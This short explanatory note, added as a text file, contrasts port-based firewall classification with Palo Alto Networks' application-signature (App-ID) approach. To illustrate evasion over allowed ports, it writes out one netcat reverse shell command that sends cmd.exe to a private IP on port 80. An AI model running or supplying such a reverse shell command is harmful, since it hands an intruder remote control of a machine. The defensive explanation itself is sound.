@@ -1,0 +1,15 @@
+Traditional firewalls traffic classification has always been conducted via a port and protocol process.
+
+However the number or P2Ps that randomly change port numbers, content-based web applications that use HTTP 80/HTTPS 443 ports, and applications that use encryption and tunnelling to conceal communication content is increasing rapidly.
+
+So a hacker can use port 80/443 because its allowed by the firewall.
+
+Nc64.exe -nv 192.168.1.103 80 -e cmd.exe
+
+If you were to have a vm try to use netcat while appid is on it will deny the traffic
+
+Palo Alto Networks has developed an innovative approach to securing networks that identifies all traffic by applications using a variety of techniques.
+
+Palo Alto firewalls use application signatures to identify whether the connection attempt is legitimate or not.
+You can find a database of identified application signatures online at:
+https://applipedi.paloaltonetworks.com
